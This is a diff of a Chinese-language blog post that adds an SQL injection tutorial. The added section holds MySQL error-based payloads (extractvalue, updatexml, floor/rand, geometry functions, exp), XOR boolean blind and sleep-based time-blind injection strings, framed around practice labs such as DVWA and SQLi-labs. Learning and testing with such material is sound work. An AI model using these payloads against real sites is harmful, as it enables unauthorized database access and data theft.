@@ -86,10 +86,21 @@
 <meta property="og:site_name" content="MagicZ">
 <meta property="og:description" content="被学长带入坑中相信好多入门web的道友都是从SQL注入开始起步的，我也一样。大学接触web安全，从此以后就进坑了。学长带着使用phpstudy搭建一个PHP开发环境，用的一个印度大汉写的SQL靶场。其实那个时候我只会跟着视频里的过程走，真的不理解SQL注入原理，PHP是世界上最好的语言，学了以后才慢慢的理解原理，说起来吧我的基础也不是很好，跟我同届的坑友都脱坑了，各种漏洞平台提交漏洞。我呢？安心的">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-01T12:56:08.876Z">
+<meta property="og:image" content="http://yoursite.com/images/sql_1.png">
+<meta property="og:image" content="http://yoursite.com/images/sql_2.png">
+<meta property="og:image" content="http://yoursite.com/images/sql_4.png">
+<meta property="og:image" content="http://yoursite.com/images/sql_5.png">
+<meta property="og:image" content="http://yoursite.com/images/sql_6.png">
+<meta property="og:image" content="http://yoursite.com/images/sql_7.png">
+<meta property="og:image" content="http://yoursite.com/images/sql_8.png">
+<meta property="og:image" content="http://yoursite.com/images/sql_9.png">
+<meta property="og:image" content="http://yoursite.com/images/sql_10.png">
+<meta property="og:image" content="http://yoursite.com/images/sql_11.png">
+<meta property="og:updated_time" content="2019-03-01T14:41:02.274Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL入坑">
 <meta name="twitter:description" content="被学长带入坑中相信好多入门web的道友都是从SQL注入开始起步的，我也一样。大学接触web安全，从此以后就进坑了。学长带着使用phpstudy搭建一个PHP开发环境，用的一个印度大汉写的SQL靶场。其实那个时候我只会跟着视频里的过程走，真的不理解SQL注入原理，PHP是世界上最好的语言，学了以后才慢慢的理解原理，说起来吧我的基础也不是很好，跟我同届的坑友都脱坑了，各种漏洞平台提交漏洞。我呢？安心的">
+<meta name="twitter:image" content="http://yoursite.com/images/sql_1.png">
 
 
 
@@ -314,8 +325,47 @@
 <p>SQL注入天书（入门必看书）：<a href="https://pan.baidu.com/s/1ViOSwvb3Qf6BunMG2IfMRw" target="_blank" rel="noopener">https://pan.baidu.com/s/1ViOSwvb3Qf6BunMG2IfMRw</a></p>
 <p>漏洞测试靶机源代码：<a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p>
 <p>BWAPP漏洞平台:<a href="http://www.itsecgames.com" target="_blank" rel="noopener">http://www.itsecgames.com</a></p>
-<p>以上的漏洞测试平台安装步骤可以搜谷歌，百度，都有详细的步骤。<br>SQL注入天书和SQLi-LABS是一个学习注入非常有效的组合</p>
-<p>### </p>
+<p>以上的漏洞测试平台安装步骤可以搜谷歌，百度，都有详细的步骤。<br>SQL注入天书和SQLi-LABS是一个学习注入非常有效的组合<br><a id="more"></a></p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1.floor()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/sql_1.png" alt></p>
+<p>2.extractvalue()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/sql_2.png" alt></p>
+<p>3.updatexml()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
+<p>4.geometrycollection()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+<p><img src="/images/sql_4.png" alt></p>
+<p>5.multipoint()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+<p><img src="/images/sql_5.png" alt></p>
+<p>6.polygon()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+<p><img src="/images/sql_6.png" alt></p>
+<p>7.multipolygon()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+<p><img src="/images/sql_7.png" alt></p>
+<p>8.linestring()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+<p><img src="/images/sql_8.png" alt></p>
+<p>9.multilinestring()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+<p><img src="/images/sql_9.png" alt></p>
+<p>10.exp()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+<p><img src="/images/sql_10.png" alt></p>
+<h3 id="“按位异或运算”测试"><a href="#“按位异或运算”测试" class="headerlink" title="“按位异或运算”测试:"></a>“按位异或运算”测试:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1^1=0</span><br><span class="line">1^0=1</span><br><span class="line">0^0=0</span><br></pre></td></tr></table></figure>
+<p>具体原理参考：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80667775" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80667775</a></p>
+<p>数据库语句测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1^(1=1)^1</span><br></pre></td></tr></table></figure>
+<p>网站测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:xxxnid=216^(1=1)^1	正常页面</span><br><span class="line">payload:xxxnid=216^(1=2)^1	错误页面的</span><br></pre></td></tr></table></figure></p>
+<p>判断数据库的长度：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:xxxnid=216^(1=(if((length(database())&gt;10),1,0)))^1</span><br></pre></td></tr></table></figure></p>
+<p>注意：类似的盲注方法还有like匹配注入，left()函数，mid()函数，substr()函数等等</p>
+<p>构造获取表名:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:select left((select table_name frominformation_schema.tables where table_schema=&apos;test&apos; limit 0,1),1)=&apos;u&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>If(expr1,expr2,expr3)   如果expr1为TRUE 则执行expr2 否则执行expr3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload：1&apos;+and+if(ord(mid(database(),1,1))=116,sleep(5),1)—+</span><br></pre></td></tr></table></figure>
+<p><img src="/images/sql_11.png" alt></p>
+<h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>这里给一个链接原理在这个大佬写的文章中：<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">limit 注入原理</a></p>
 
       
     </div>
@@ -462,7 +512,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#被学长带入坑中"><span class="nav-number">1.</span> <span class="nav-text">被学长带入坑中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入环境搭建"><span class="nav-number">2.</span> <span class="nav-text">SQL注入环境搭建</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#被学长带入坑中"><span class="nav-number">1.</span> <span class="nav-text">被学长带入坑中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入环境搭建"><span class="nav-number">2.</span> <span class="nav-text">SQL注入环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">3.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#“按位异或运算”测试"><span class="nav-number">4.</span> <span class="nav-text">“按位异或运算”测试:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">5.</span> <span class="nav-text">基于时间的盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#limit-注入"><span class="nav-number">6.</span> <span class="nav-text">limit 注入</span></a></li></ol></div>
             
 
           </div>
